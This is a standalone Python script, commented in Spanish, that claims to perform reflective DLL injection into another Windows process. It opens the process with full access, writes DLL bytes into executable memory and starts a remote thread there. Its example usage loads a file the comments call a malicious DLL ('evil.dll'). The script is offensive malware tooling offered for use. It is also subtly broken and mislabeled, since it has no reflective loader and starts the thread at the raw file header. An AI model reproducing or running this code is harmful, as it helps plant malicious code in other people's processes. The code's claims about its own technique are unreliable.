import ctypes
import sys
from ctypes import wintypes
from uuid import UUID

# Constantes de Windows
PROCESS_ALL_ACCESS = 0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# Estructuras necesarias
class _SECURITY_ATTRIBUTES(ctypes.Structure):
    _fields_ = [("nLength", wintypes.DWORD),
                ("lpSecurityDescriptor", wintypes.LPVOID),
                ("bInheritHandle", wintypes.BOOL)]

# API de Windows
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)

# Prototipos de funciones
OpenProcess = kernel32.OpenProcess
VirtualAllocEx = kernel32.VirtualAllocEx
WriteProcessMemory = kernel32.WriteProcessMemory
CreateRemoteThread = kernel32.CreateRemoteThread
RtlCreateUserThread = ntdll.RtlCreateUserThread

def reflective_dll_injection(pid, dll_bytes):
    """
    Inyecta una DLL en memoria en un proceso objetivo usando Reflective DLL Injection.
    
    Args:
        pid (int): ID del proceso objetivo.
        dll_bytes (bytes): DLL en formato binario (previamente convertida a bytes).
    
    Returns:
        bool: True si la inyección fue exitosa.
    """
    try:
        # 1. Abrir proceso objetivo
        h_process = OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        if not h_process:
            raise ctypes.WinError(ctypes.get_last_error())

        # 2. Asignar memoria en el proceso
        dll_size = len(dll_bytes)
        remote_memory = VirtualAllocEx(h_process, None, dll_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)
        if not remote_memory:
            raise ctypes.WinError(ctypes.get_last_error())

        # 3. Escribir DLL en memoria
        written = wintypes.SIZE_T()
        if not WriteProcessMemory(h_process, remote_memory, dll_bytes, dll_size, ctypes.byref(written)):
            raise ctypes.WinError(ctypes.get_last_error())

        # 4. Crear hilo remoto para ejecutar la DLL
        thread_id = wintypes.DWORD()
        h_thread = CreateRemoteThread(h_process, None, 0, remote_memory, None, 0, ctypes.byref(thread_id))
        if not h_thread:
            raise ctypes.WinError(ctypes.get_last_error())

        return True

    except Exception as e:
        print(f"[!] Error durante la inyección: {str(e)}")
        return False

# --- Uso avanzado (Opcional) ---
def convert_dll_to_mem(dll_path):
    """Convierte una DLL a bytes para inyección en memoria."""
    with open(dll_path, 'rb') as f:
        return f.read()

if __name__ == "__main__":
    # Ejemplo de uso (requiere DLL compilada)
    PID = 1234  # Reemplazar con PID objetivo
    DLL_PATH = "evil.dll"  # DLL maliciosa (previamente generada)
    
    dll_data = convert_dll_to_mem(DLL_PATH)
    if reflective_dll_injection(PID, dll_data):
        print("[+] DLL inyectada con éxito!")
    else:
        print("[-] Fallo en la inyección.")
